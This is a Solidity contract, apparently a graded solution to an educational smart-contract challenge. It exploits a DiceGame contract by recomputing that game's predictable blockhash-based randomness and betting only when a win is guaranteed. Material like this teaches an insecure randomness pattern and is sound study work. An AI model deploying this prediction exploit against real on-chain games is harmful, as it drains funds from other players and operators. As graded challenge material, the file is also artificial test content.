pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    error NotWinningRoll(uint256 predictedRoll);
    error InsufficientBalance(uint256 required, uint256 available);
    error ZeroAddress();
    error WithdrawFailed();

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address _addr, uint256 _amount) external onlyOwner {
        if (_addr == address(0)) revert ZeroAddress();

        uint256 available = address(this).balance;
        if (_amount > available) {
            revert InsufficientBalance(_amount, available);
        }

        (bool sent, ) = payable(_addr).call{ value: _amount }("");
        if (!sent) revert WithdrawFailed();
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() external payable {
        uint256 bet = 0.002 ether;
        uint256 available = address(this).balance;
        if (available < bet) {
            revert InsufficientBalance(bet, available);
        }

        uint256 predictedNonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), predictedNonce));
        uint256 roll = uint256(hash) % 16;

        console.log("\t", "RiggedRoll predicted roll:", roll);

        if (roll > 5) {
            revert NotWinningRoll(roll);
        }

        diceGame.rollTheDice{ value: bet }();
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
